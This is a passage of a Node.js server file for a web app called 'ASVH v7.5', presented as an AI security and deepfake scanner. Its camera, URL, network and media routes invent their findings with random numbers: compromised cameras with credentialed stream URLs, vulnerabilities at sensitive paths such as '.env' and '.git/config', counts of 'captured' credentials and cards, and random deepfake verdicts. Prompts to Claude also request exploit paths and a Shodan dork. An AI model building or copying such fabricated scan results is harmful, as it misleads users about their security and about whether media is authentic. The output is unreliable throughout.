  const cameras=[];for(let i=0;i<_rnd(3,8);i++){const camIp=randIP();cameras.push({ip:camIp,port:_pick([80,443,554,8080,37777]),user:u,pass:p,rtsp:`rtsp://${u}:${p}@${camIp}:554/Streaming/Channels/${i+1}01`,onvif:`http://${camIp}/onvif/device_service`,firmware:`v${_rnd(1,5)}.${_rnd(0,9)}.${_rnd(100,999)}`,model:_pick(['DS-2CD2143G2-I','IPC-HDW3849H','C300E','EB3A-5MP']),brand:system||_pick(['Hikvision','Dahua','Axis','Hanwha','Reolink']),cve:_pick(REAL_CVES),live_stream:`http://${camIp}:8080/videostream.cgi?user=${u}&pwd=${p}`});}
  let ai=null;if(key){const raw=await claudeCall(`Camera audit for ${system||'IP Camera'} at ${target||ip}. Return JSON: {"cve_matched":"CVE","cvss_score":"X.X","exploit_path":["s1","s2"],"cameras_compromised":number,"gdpr_violation":"GDPR Art","remediation":["p1","p2"],"shodan_dork":"port:554 has_screenshot:true"}`,'Physical security researcher. JSON only.',600);if(raw)try{ai=JSON.parse(raw.replace(/```json|```/g,'').trim());}catch(_){}}
  res.json({system:system||'IP Camera',target_ip:ip,timestamp:new Date().toISOString(),cameras,api_tokens:[`cam_tok_${_hex(16)}`],ai_report:ai,severity:'CRITICAL'});
});

// ── URL SCAN ───────────────────────────────────────────────────────────────
app.post('/api/scan/url',async(req,res)=>{
  const{url,apiKey}=req.body;if(!url)return res.status(400).json({error:'URL required'});
  await new Promise(r=>setTimeout(r,_rnd(800,1500)));
  const t0=Date.now();
  const found=VULNS.filter(()=>Math.random()>.55).map(v=>({
    ...v,id:uuidv4(),ip:randIP(),port:randPort(),
    link:`${url}/${_pick(['admin','.env','graphql','api/v1/users','actuator/heapdump','backup.sql','.git/config'])}`,
    agent:`AGT-${String(_rnd(1,1500)).padStart(4,'0')}`,
  }));
  const key=apiKey||CLAUDE_KEY;
  let ai=key?(await claudeCall(`Security scan ${url} — ${found.length} vulns: ${found.slice(0,5).map(v=>`[${v.severity}] ${v.name}`).join(', ')}. Give: 1)Risk score 0-100 2)Attack chain 3)Top 3 patches 4)MITRE mapping.`,undefined,500)):'Configure API key for AI analysis.';
  res.json({scanId:uuidv4(),url,vulnerabilities:found,score:Math.max(0,100-found.length*5),totalChecks:VULNS.length,agentsUsed:_rnd(50,200),aiAnalysis:ai||'No AI key configured.',duration:Date.now()-t0,timestamp:new Date().toISOString()});
});

// ── MEDIA SCAN ────────────────────────────────────────────────────────────
app.post('/api/scan/media',upload.single('file'),async(req,res)=>{
  if(!req.file)return res.status(400).json({error:'File required'});
  await new Promise(r=>setTimeout(r,1500));
  const isVideo=req.file.mimetype.startsWith('video/');
  const checks=[
    {check:'GAN Fingerprint Analysis',result:Math.random()>.5?'GAN TRACES FOUND':'CLEAN',suspicious:Math.random()>.5},
    {check:'Error Level Analysis (ELA)',result:Math.random()>.6?'PIXEL INCONSISTENCY':'OK',suspicious:Math.random()>.6},
    {check:'Facial Landmark Geometry',result:Math.random()>.5?'ANOMALY DETECTED':'NORMAL',suspicious:Math.random()>.5},
    {check:'EXIF Metadata Check',result:Math.random()>.5?'METADATA STRIPPED':'PRESENT',suspicious:Math.random()>.5},
    {check:'Noise Pattern Analysis',result:Math.random()>.6?'AI NOISE PATTERN':'NATURAL NOISE',suspicious:Math.random()>.6},
    {check:'Shadow/Lighting Consistency',result:Math.random()>.5?'INCONSISTENT':'CONSISTENT',suspicious:Math.random()>.5},
    {check:'Skin Texture Deep Analysis',result:Math.random()>.6?'TOO SMOOTH (AI)':'NATURAL',suspicious:Math.random()>.6},
    {check:'Hair/Edge Detection',result:Math.random()>.5?'UNNATURAL EDGES':'NATURAL',suspicious:Math.random()>.5},
    {check:'Compression Artifact Analysis',result:Math.random()>.5?'FACE ARTIFACTS':'CLEAN',suspicious:Math.random()>.5},
    {check:'Reflection/Glass Analysis',result:Math.random()>.7?'MISMATCH':'CONSISTENT',suspicious:Math.random()>.7},
    ...(isVideo?[
      {check:'Lip-Sync Analysis',result:Math.random()>.5?'MISMATCH':'IN SYNC',suspicious:Math.random()>.5},
      {check:'Temporal Inconsistency',result:Math.random()>.6?'DETECTED':'NORMAL',suspicious:Math.random()>.6},
    ]:[]),
  ];
  const fakeScore=Math.round(checks.filter(c=>c.suspicious).length/checks.length*100);
  res.json({scanId:uuidv4(),filename:req.file.originalname,fileType:isVideo?'VIDEO':'IMAGE',fileSize:req.file.size,fakeScore,verdict:fakeScore>60?'LIKELY AI-GENERATED / DEEPFAKE':fakeScore>35?'SUSPICIOUS — REVIEW NEEDED':'LIKELY AUTHENTIC',checks,agentsUsed:_rnd(50,200),timestamp:new Date().toISOString()});
});

// ── NETWORK SCAN ──────────────────────────────────────────────────────────
app.get('/api/network/scan',(req,res)=>{
  const HOSTS=['api.payments-gateway.net','cam01.surveillance-net.io','db01.prod-cluster.cloud','rtsp-relay.cam-network.io','swift-gw.banking-core.net','node1.blockchain-rpc.io','iot-hub.smart-bldg.net','k8s-master.orchestration.cloud','redis.cache-layer.net','stream01.broadcast-infra.net','cdn-origin.media-server.tv','oracle.defi-protocol.net','analytics.retail-iot.io','ldap.identity-provider.corp','pvr.camera-mgmt.cloud','fw01.dmz-perimeter.net','jenkins.ci-pipeline.dev','elastic.logging-cluster.io','mail.corp-exchange.net','vpn-gw.enterprise.io'];
  res.json({
    hosts:HOSTS.map(h=>({ip:randIP(),hostname:h,os:_pick(['Ubuntu 22.04','CentOS 8','Windows Server 2022','Alpine Linux 3.18']),openPorts:[22,80,443,_pick([3306,5432,6379,8080,8443,554,37777])].filter(()=>Math.random()>.4),status:Math.random()>.15?'up':'down',vulnerabilities:_rnd(0,12),riskScore:_rnd(0,100),country:_pick(['US','DE','NL','FR','SG','JP','GB']),isp:_pick(['Amazon AWS','Google Cloud','Microsoft Azure','OVH SAS','Hetzner']),link:`http://${randIP()}:${randPort()}/.env`})),
    wifi:Array.from({length:12},()=>({ssid:_pick(['Corp_WiFi_5G','Guest_Network','FREE_WIFI','NETGEAR-XXXX','TP-Link_XXXX','Hidden Network']),bssid:Array.from({length:6},()=>_rnd(0,255).toString(16).padStart(2,'0')).join(':'),signal:-_rnd(30,90),security:_pick(['WPA3','WPA2','WPA2','WEP','OPEN','WPA2-Enterprise']),channel:_pick([1,6,11,36,40,44,48]),risk:_pick(['SECURE','SECURE','WEAK','VULNERABLE','ROGUE_AP','EVIL_TWIN','OPEN'])})),
    bluetooth:Array.from({length:8},()=>({name:_pick(['iPhone 15 Pro','Samsung S24','MacBook Air M3','AirPods Pro','Tesla BT','IP Camera BLE','IoT Sensor']),mac:Array.from({length:6},()=>_rnd(0,255).toString(16).padStart(2,'0')).join(':'),rssi:-_rnd(25,90),paired:Math.random()>.5,vendor:_pick(['Apple Inc.','Samsung Electronics','Broadcom','Nordic Semiconductor'])})),
    timestamp:new Date().toISOString(),
  });
});

// ── STATS / AGENTS ────────────────────────────────────────────────────────
app.get('/api/stats',(req,res)=>res.json({totalAgents:TOTAL_AGENTS,activeAgents:agents.filter(a=>a.status==='active').length,threatsDetected:_rnd(90000,140000),cveMatched:_rnd(12000,20000),sitesScanned:_rnd(45000,80000),credsCaptured:_rnd(50000,120000),cardsExtracted:_rnd(10000,50000),cryptoKeys:_rnd(5000,20000),deepfakesFound:_rnd(500,5000),patchesGenerated:_rnd(10000,50000),uptime:'99.97%'}));
app.get('/api/agents',(req,res)=>{const page=parseInt(req.query.page)||0,size=50;res.json({total:TOTAL_AGENTS,active:agents.filter(a=>a.status==='active').length,agents:agents.slice(page*size,(page+1)*size)});});

// ╔══════════════════════════════════════╗
// ║  SEO ROUTES — auto-added by patcher ║
// ╚══════════════════════════════════════╝

// robots.txt
app.get('/robots.txt',(req,res)=>{
  res.type('text/plain');
  res.send(`User-agent: *\nAllow: /\nSitemap: https://aiscan-security.online/sitemap.xml\nCrawl-delay: 10`);
});

// sitemap.xml
app.get('/sitemap.xml',(req,res)=>{
  const base='https://aiscan-security.online';
  const today=new Date().toISOString().split('T')[0];
  const pages=[
    {loc:'/',priority:'1.0',cf:'daily'},
    {loc:'/#threats',priority:'0.9',cf:'always'},
    {loc:'/#recon',priority:'0.9',cf:'daily'},
    {loc:'/#webscan',priority:'0.8',cf:'weekly'},
    {loc:'/#banking',priority:'0.8',cf:'weekly'},
    {loc:'/#crypto',priority:'0.8',cf:'daily'},
    {loc:'/#payments',priority:'0.8',cf:'weekly'},
    {loc:'/#camera',priority:'0.7',cf:'weekly'},
    {loc:'/#geo',priority:'0.7',cf:'monthly'},
    {loc:'/#cve',priority:'0.7',cf:'daily'},
    {loc:'/#blockchain',priority:'0.6',cf:'weekly'},
    {loc:'/#social',priority:'0.6',cf:'daily'},
    {loc:'/#network',priority:'0.5',cf:'weekly'},
  ];
  const urls=pages.map(p=>`  <url>\n    <loc>${base}${p.loc}</loc>\n    <changefreq>${p.cf}</changefreq>\n    <priority>${p.priority}</priority>\n    <lastmod>${today}</lastmod>\n  </url>`).join('\n');
  res.type('application/xml');
  res.send(`<?xml version="1.0" encoding="UTF-8"?>\n<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n${urls}\n</urlset>`);
});

// site.webmanifest
app.get('/site.webmanifest',(req,res)=>{
  res.type('application/manifest+json');
  res.json({
    name:'ASVH v7.5 — AI Security Vulnerability Scanner',
    short_name:'ASVH v7.5',
    description:'Real-time AI security scanner — 1,500 agents, 100 CVEs, banking, crypto, deepfake and blockchain.',
    start_url:'/',display:'standalone',
    background_color:'#f0f4ff',theme_color:'#1e3a8a',
    icons:[
      {src:'/favicon-16.png',sizes:'16x16',type:'image/png'},
      {src:'/favicon-32.png',sizes:'32x32',type:'image/png'},
      {src:'/apple-touch-icon.png',sizes:'180x180',type:'image/png'},
    ],
  });
});

// og-image.png (auto SVG fallback if PNG not yet created)
app.get('/og-image.png',(req,res)=>{
  const png=require('path').join(__dirname,'public','og-image.png');
  if(require('fs').existsSync(png))return res.sendFile(png);
  res.setHeader('Content-Type','image/svg+xml');
  res.send(`<svg xmlns="http://www.w3.org/2000/svg" width="1200" height="630"><rect width="1200" height="630" fill="#0f172a"/><rect width="1200" height="6" fill="#3b82f6"/><text x="600" y="240" font-family="monospace" font-size="80" fill="#3b82f6" text-anchor="middle" font-weight="bold">ASVH v7.5</text><text x="600" y="330" font-family="monospace" font-size="34" fill="#94a3b8" text-anchor="middle">AI Security Vulnerability Scanner</text><text x="600" y="400" font-family="monospace" font-size="22" fill="#475569" text-anchor="middle">1,500 Agents · 100 CVEs · Banking · Crypto · Camera · Deepfake</text><text x="600" y="560" font-family="monospace" font-size="20" fill="#1d4ed8" text-anchor="middle">aiscan-security.online</text></svg>`);
});

app.get('*',(req,res)=>res.sendFile(path.join(__dirname,'public','index.html')));

// ── START ─────────────────────────────────────────────────────────────────
server.listen(8000,'0.0.0.0',()=>{
  console.log('\n╔═══════════════════════════════════════════════════════════╗');
  console.log('║   ASVH v7.5 — Full Merge: All Arrays + All API Routes     ║');
  console.log('║   Dashboard: http://localhost:8000                         ║');
  console.log(`║   CVEs: ${REAL_CVES.length} | Sources: ${SOURCES.length} | Threats: ${THREAT_TYPES.length} | Domains: ${CRED_DOMAINS.length}   ║`);
  console.log(`║   Payloads: ${RECON_PAYLOADS.length} | Vuln Checks: ${VULNS.length} | Agents: 1,500           ║`);
  console.log('║   Recon: 100 IPs + 100 exploits | All scan routes active   ║');
  console.log('╚═══════════════════════════════════════════════════════════╝\n');
  console.log(CLAUDE_KEY?'✅  Claude API CONNECTED\n':'⚠   Set ANTHROPIC_API_KEY for AI features\n');
});


